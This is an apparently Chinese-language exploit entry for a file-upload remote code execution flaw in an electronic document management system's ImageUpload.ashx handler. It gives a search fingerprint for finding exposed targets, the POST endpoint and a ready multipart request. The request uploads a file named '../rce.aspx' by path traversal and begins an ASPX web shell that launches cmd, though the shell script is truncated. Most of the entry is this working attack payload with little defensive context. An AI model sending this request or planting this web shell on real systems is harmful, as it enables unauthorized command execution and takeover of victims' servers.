# 电子资料管理系统ImageUpload.ashx文件上传致RCE漏洞

- **系统**：电子资料管理系统ImageUpload.ashx文件上传致　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="Menu/Login/ThirdLoginHandler.ashx"`
- **请求**：`POST /Menu/ImageManger/ImageUpload.ashx HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPp…`

**请求体 / payload**
```
------WebKitFormBoundaryssh7UfnPpGU7BXfK
Content-Disposition: form-data; name="isUpload"
印章图片
------WebKitFormBoundaryssh7UfnPpGU7BXfK
Content-Disposition: form-data; name="entid"
666
------WebKitFormBoundaryssh7UfnPpGU7BXfK
Content-Disposition: form-data; name="Type"
1
------WebKitFormBoundaryssh7UfnPpGU7BXfK
Content-Disposition: form-data; name="Filedata"; filename="../rce.aspx"
Content-Type: text/plain
<%@ Page Language="Jscript" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO…（脚本共 964 字，完整版见原文）
```
- **预期**：200　|　—